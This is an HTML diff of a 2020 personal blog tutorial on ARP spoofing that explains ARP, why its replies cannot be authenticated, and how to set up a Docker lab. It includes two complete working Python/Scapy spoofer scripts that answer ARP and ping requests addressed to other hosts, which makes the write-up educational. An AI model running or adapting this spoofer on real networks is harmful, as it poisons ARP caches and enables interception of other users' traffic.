@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ARP Spoofing using Scapy — Manoj Vignesh K M</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,300;0,400;0,700;1,400&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/blog/assets/css/style.css" />
+</head>
+<body>
+  <header class="blog-header">
+    <a href="/" class="back-link">← Portfolio</a>
+    <a href="/blog/" class="blog-title">Manoj's Blog</a>
+  </header>
+  <main class="blog-content">
+    <article class="post">
+  <header class="post-header">
+    <h1>ARP Spoofing using Scapy</h1>
+    <time datetime="2020-08-01T23:30:00-07:00">
+      August 1, 2020
+    </time>
+    
+    <div class="post-tags">
+      <span class="tag">networking</span><span class="tag">security</span><span class="tag">scapy</span>
+    </div>
+    
+  </header>
+
+  <div class="post-layout">
+    <aside class="post-toc" id="toc">
+      <p class="toc-title">Contents</p>
+      <nav id="toc-nav"></nav>
+    </aside>
+
+    <div class="post-body" id="post-body">
+      <blockquote>
+  <p>Learn and try out ARP spoofing all by yourself in a Docker network using Scapy!</p>
+</blockquote>
+
+<p><strong>ARP spoofing</strong> or <strong>ARP cache poisoning</strong> is a network exploitation technique in which a malicious node in a local area network claims itself to be one of the other nodes in the network. A malicious user performs this attack on LAN to establish itself as a man in the middle, or sometimes act as the destination node itself.</p>
+
+<h2 id="what-is-arp">What is ARP?</h2>
+
+<p><strong>ARP</strong> stands for <strong>Address resolution protocol</strong>. This protocol works between Layer 2 and Layer 3 of the OSI model. The goal of this protocol is to exchange the MAC address of the next-hop node when the requesting node knows the IP address of the next-hop node.</p>
+
+<p>Consider a LAN network having subnet ID 172.17.0.0/24, where a node, <em>Node A</em>, is trying to navigate to the medium.com website. <em>Node A</em> has an IP address 172.17.0.2, which it received from the DHCP pool when it first entered the network. In addition to the IP address, <em>Node A</em> also obtained the gateway IP address (say, 172.17.0.1) and the DNS IP address (say, 172.17.0.100) during the DHCP offer. To make an HTTP request to medium.com, <em>Node A</em> begins by building the packet. While building the IP layer (L3) of the packet it needs to fill in the IP address in the <em>dst</em> field of the L3 headers. Let’s say, it found the hostname-IP mapping in its own cache (after all it is a frequently accessed website 😉 ) and hence didn’t perform a DNS request. Then, the packet building proceeds to the data link layer (L2). Now, <em>Node A</em> needs to fill in the destination MAC address in <em>dst</em> field of the L2 headers. It realizes that the destination IP address is outside the subnet in which it is residing. The node then looks into its routing table and identifies the next-hop IP address i.e. the gateway IP address. Hence, in the L2 header of the HTTP request, it needs to fill in the MAC address of the gateway node. Thus, <em>Node A</em> makes an <strong>ARP request</strong> by broadcasting a message that says “Hey, <strong><em>everyone</em></strong>! I am <strong><em>Node A,</em></strong> and here is my MAC address and my IP address. Tell <strong><em>me</em></strong> who is <strong><em>172.17.0.1</em></strong>!” The appropriate node i.e. the gateway, replies with an <strong>ARP response</strong> by sending a unicast message that says “Hey, <strong><em>Node A</em>!</strong> I am gateway, and here is my MAC address and my IP address. My MAC address is <strong><em>00:01:02:03:04:05</em></strong>.” Once, Node A receives the MAC address, it fills in the details in the L2 header of the HTTP request and puts the packet into the network. The rest is history!</p>
+
+<p>The following two images show the network capture of ARP request and ARP response in the LAN:</p>
+
+<p><img src="/blog/assets/res/arp_spoofing_using_scapy/arp_request_by_node_a.png" alt="ARP request by Node A" />
+<em>ARP request by Node A</em></p>
+
+<p><img src="/blog/assets/res/arp_spoofing_using_scapy/arp_response_by_the_gateway.png" alt="ARP response by the gateway" />
+<em>ARP response by the gateway</em></p>
+
+<h2 id="the-unauthenticable-response">The “unauthenticable” response</h2>
+
+<p>Carefully observe the last couple of network transactions. An ARP request is broadcasted into the LAN because <em>Node A</em> does not know the MAC address of the gateway. <em>Node A</em> then receives a response from the “<em>relevant”</em> node. <em>Node A</em> has no way to authenticate the response it got. It has to blindly believe that the MAC address claimed in the response is the MAC address of the gateway. This is where ARP spoofing comes into play!</p>
+
+<p>A malicious node in the LAN could respond back to <em>Node A</em> as soon as it sees an ARP request in the LAN from <em>Node A</em>. Luckily, if the malicious node’s response reaches <em>Node A</em> first then the malicious node has successfully spoofed itself as the node that <em>Node A</em> is to communicate with.</p>
+
+<h2 id="dont-talk-show-me-the-code"><strong>Don’t talk, show me the code!</strong></h2>
+
+<p>In this demonstration, <a href="https://www.docker.com/products/docker-desktop">Docker</a> containers are used as nodes and a Docker network as the local area network. <a href="https://scapy.net/">Scapy</a>, a network utility to craft custom packets, is used in the malicious node to craft spoofed ARP response and spoofed ICMP responses.</p>
+
+<h3 id="magic">Magic</h3>
+
+<p>The following terminal snapshot shows a successful ARP spoof. Observe that the docker network, named <em>lan</em> and having subnet ID 192.168.56.0/24, has only two nodes with IP addresses 192.168.56.2 and 192.168.56.3. But surprisingly, a node is able to make successful pings to 192.168.56.4!</p>
+
+<p><img src="/blog/assets/res/arp_spoofing_using_scapy/successful_arp_spoof_terminal.png" alt="" /></p>
+
+<h3 id="the-spoofer">The Spoofer</h3>
+
+<p>In this demonstration, we shall spoof ourselves as a node that is not alive in the LAN. Hence, when a victim node makes an ARP request to an IP address that is not live, the spoofer node jumps in to claim the node as itself by responding to the ARP request with its own MAC address. In other words, the spoofer node is going to respond to the request meant for other nodes.</p>
+
+<p>The spoofer code is written in python 3 and uses the Scapy library.
+Code format inspired by <a href="https://thepacketgeek.com/scapy/building-network-tools/part-09/">https://thepacketgeek.com/scapy/building-network-tools/part-09/</a></p>
+
+<noscript><pre>from scapy.all import *
+
+INTERFACE = &quot;eth0&quot;
+MY_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
+MY_IP_ADDRESS = get_if_addr(INTERFACE)
+
+&#39;&#39;&#39;
+Approach 1: using prn function as a workaround
+$ python3 arp_spoof.py
+&#39;&#39;&#39;
+def spoofer(request):
+    if request.haslayer(&#39;ARP&#39;) and request[ARP].op == 1 and request[ARP].pdst != MY_IP_ADDRESS:
+        print(f&quot;ARP request from {request[Ether].src} / {request[ARP].psrc} for {request[ARP].pdst}&quot;)
+        response = Ether()/ARP()
+
+        response[Ether].dst = request[Ether].src
+        response[Ether].src = MY_MAC_ADDRESS
+
+        response[ARP].op = 2
+        response[ARP].hwsrc = MY_MAC_ADDRESS
+        response[ARP].hwdst = request[ARP].hwsrc
+        response[ARP].psrc = request[ARP].pdst
+        response[ARP].pdst = request[ARP].psrc
+
+        print(f&quot;ARP response as {response[ARP].psrc} with MAC address {response[ARP].hwsrc} to {response[Ether].dst} / {response[ARP].pdst} for {response[ARP].psrc}&quot;)
+        sendp(response)
+    
+    elif request.haslayer(&#39;ICMP&#39;) and request[ICMP].type == 8 and request[IP].dst != MY_IP_ADDRESS :
+        print(f&quot;ICMP request from {request[IP].src} to {request[IP].dst}&quot;)
+        response = Ether()/IP()/ICMP()/&quot;&quot;
+
+        response[Ether].dst = request[Ether].src
+        response[Ether].src = MY_MAC_ADDRESS
+
+        response[IP].src = request[IP].dst
+        response[IP].dst = request[IP].src
+
+        response[ICMP].type = 0
+        response[ICMP].id = request[ICMP].id
+        response[ICMP].seq = request[ICMP].seq
+
+        response[Raw].load = request[Raw].load
+
+        print(f&quot;ICMP response to {response[IP].dst} as {response[IP].src}&quot;)
+        sendp(response)
+
+sniff(prn=spoofer, iface=INTERFACE)</pre></noscript>
+<script src="https://gist.github.com/kmmanoj/d3c39c323b0a96f9e7cc4974fae77654.js"> </script>
+
+<p>The main function sniffs for packets in the local area network. Each packet is processed by the <code class="language-plaintext highlighter-rouge">spoofer</code> function.</p>
+
+<p>The spoofer function handles two types of request:</p>
+
+<ul>
+  <li>ARP request not for itself</li>
+  <li>ICMP request not for itself</li>
+</ul>
+
+<p>For the ARP request, it crafts an ARP response packet. It sets the destination MAC address and IP address with sender details. It fills the source MAC address as it’s own MAC address, while source IP address as the destination IP address found in the request packet. This is how the malicious node is able to claim itself as the IP address in the request packet.</p>
+
+<p>The implementation performs a similar header value setting for the ICMP response too.</p>
+
+<h3 id="setup">Setup</h3>
+
+<p>The lab environment used here is a machine that has <a href="https://www.docker.com/products/docker-desktop">Docker engine</a> installed. Let us first create a docker network with subnet ID 192.168.56.0/24. Run the following command to create the docker network with an identifier, <em>lan</em>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker network create lan <span class="nt">--subnet</span> 192.168.56.0/24
+</code></pre></div></div>
+
+<p>In a terminal instance, spin up a <code class="language-plaintext highlighter-rouge">scapy</code> docker container in <em>lan</em> network in interactive mode and requesting for a TTY. In addition, mount the volume which contains the spoofer code. (Or you could perform a <a href="https://docs.docker.com/engine/reference/commandline/cp/">docker copy</a>) The <a href="https://github.com/kmm4n0j/100days_of_infosec/blob/master/scapy/dockerfile">scapy</a> docker image is built on top of <code class="language-plaintext highlighter-rouge">[ehlers/scapy](https://hub.docker.com/r/ehlers/scapy)</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--network</span> lan <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/arp_spoof.py:/arp_spoof.py scapy
+</code></pre></div></div>
+
+<p>Run the <code class="language-plaintext highlighter-rouge">arp_spoof.py</code> file</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 /arp_spoof.py
+</code></pre></div></div>
+
+<p>Then, in another terminal instance spin up a <code class="language-plaintext highlighter-rouge">busybox</code> container in <em>lan</em> network in interactive mode and requesting for a TTY. A <code class="language-plaintext highlighter-rouge">busybox</code> docker image has network utilities, such as <em>ping</em> and <em>nslookup</em>, pre-installed in them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--network</span> lan busybox
+</code></pre></div></div>
+
+<p>Now, ping different IP addresses and observe that every IP address is reachable, while, there are only two nodes in the network! Hence, the spoofer was successfully able to imitate itself as other nodes in the LAN!</p>
+
+<p><img src="/blog/assets/res/arp_spoofing_using_scapy/demonstration_of_a_successful_arp_spoofing_attack.png" alt="Demonstration of a successful ARP spoofing attack" />
+<em>Demonstration of a successful ARP spoofing attack</em></p>
+
+<h3 id="how-and-why-does-it-work"><strong>How and why does it work?</strong></h3>
+
+<p>Let me keep it brief! Similar to the HTTP request, the ICMP request is being crafted by the <code class="language-plaintext highlighter-rouge">busybox</code> container. To fill in L2 header values, it broadcasts an ARP request. The spoofer jumps in and replies with an ARP unicast response. The <code class="language-plaintext highlighter-rouge">busybox</code> container learns the MAC address (as spoofer’s MAC address) associated with the requested IP address. Thus, the ping requests coming into the network hops to the network interface associated with the spoofer’s MAC address.</p>
+
+<p>Hope you like this article! More of this to come, stay tuned!</p>
+
+<h2 id="edit-arp-spoofing-using-scapy-answering-machine">Edit: ARP Spoofing using Scapy Answering machine</h2>
+
+<p>Inspired by <a href="https://twitter.com/guedou">guedou</a>!</p>
+
+<noscript><pre>import sys
+
+from threading import Thread
+from scapy.all import *
+
+INTERFACE = &quot;eth0&quot;
+MY_MAC_ADDRESS = get_if_hwaddr(INTERFACE)
+MY_IP_ADDRESS = get_if_addr(INTERFACE)
+
+&#39;&#39;&#39;
+Approach 2: Using AnsweringMachine
+$ python3 arp_spoof.py
+&#39;&#39;&#39;
+
+class ARPSpoofer(AnsweringMachine):
+    def is_request(self, request):
+        return request.haslayer(&#39;ARP&#39;) and request[ARP].op == 1 and request[ARP].pdst != MY_IP_ADDRESS
+    
+    def make_reply(self, request):
+        response = Ether()/ARP()
+
+        response[Ether].dst = request[Ether].src
+        response[Ether].src = MY_MAC_ADDRESS
+
+        response[ARP].op = 2
+        response[ARP].hwsrc = MY_MAC_ADDRESS
+        response[ARP].hwdst = request[ARP].hwsrc
+        response[ARP].psrc = request[ARP].pdst
+        response[ARP].pdst = request[ARP].psrc
+
+        return response[ARP]
+
+class PingResponder(AnsweringMachine):
+    def is_request(self, request):
+        return request.haslayer(&#39;ICMP&#39;) and request[ICMP].type == 8 and request[IP].dst != MY_IP_ADDRESS
+    
+    def make_reply(self, request):
+        response = Ether()/IP()/ICMP()/&quot;&quot;
+
+        response[Ether].dst = request[Ether].src
+        response[Ether].src = MY_MAC_ADDRESS
+
+        response[IP].src = request[IP].dst
+        response[IP].dst = request[IP].src
+
+        response[ICMP].type = 0
+        response[ICMP].id = request[ICMP].id
+        response[ICMP].seq = request[ICMP].seq
+
+        response[Raw].load = request[Raw].load
+
+        return response[IP]
+
+arp_spoofer = Thread(target=ARPSpoofer())
+arp_spoofer.start()
+
+ping_responder = Thread(target=PingResponder())
+ping_responder.start()
+
+arp_spoofer.join()
+ping_responder.join()</pre></noscript>
+<script src="https://gist.github.com/kmmanoj/b4d3a8e62ad3963e061c1cc2d0e9fc7c.js"> </script>
+
+
+    </div>
+  </div>
+</article>
+
+<script>
+(function () {
+  var headings = document.querySelectorAll('#post-body h2, #post-body h3, #post-body h4');
+  if (headings.length === 0) {
+    document.getElementById('toc').style.display = 'none';
+    return;
+  }
+
+  var nav = document.getElementById('toc-nav');
+  var ul = document.createElement('ul');
+  ul.className = 'toc-list';
+
+  headings.forEach(function (h, i) {
+    if (!h.id) h.id = 'heading-' + i;
+
+    var li = document.createElement('li');
+    li.className = 'toc-item toc-' + h.tagName.toLowerCase();
+
+    var a = document.createElement('a');
+    a.href = '#' + h.id;
+    a.textContent = h.textContent;
+    a.className = 'toc-link';
+
+    li.appendChild(a);
+    ul.appendChild(li);
+  });
+
+  nav.appendChild(ul);
+
+  // Move leading blockquote to header as subtitle
+  var body = document.getElementById('post-body');
+  var first = body.firstElementChild;
+  if (first && first.tagName === 'BLOCKQUOTE') {
+    var subtitle = document.createElement('p');
+    subtitle.className = 'post-subtitle';
+    subtitle.textContent = first.textContent.trim();
+    document.querySelector('.post-header').appendChild(subtitle);
+    first.remove();
+  }
+
+  // Highlight active heading on scroll
+  var links = nav.querySelectorAll('.toc-link');
+  var observer = new IntersectionObserver(function (entries) {
+    entries.forEach(function (entry) {
+      if (entry.isIntersecting) {
+        links.forEach(function (l) { l.classList.remove('active'); });
+        var active = nav.querySelector('a[href="#' + entry.target.id + '"]');
+        if (active) active.classList.add('active');
+      }
+    });
+  }, { rootMargin: '0px 0px -80% 0px' });
+
+  headings.forEach(function (h) { observer.observe(h); });
+}());
+</script>
+
+  </main>
+  <footer class="blog-footer">
+    <p>Manoj Vignesh K M · <a href="/">Portfolio</a></p>
+  </footer>
+</body>
+</html>
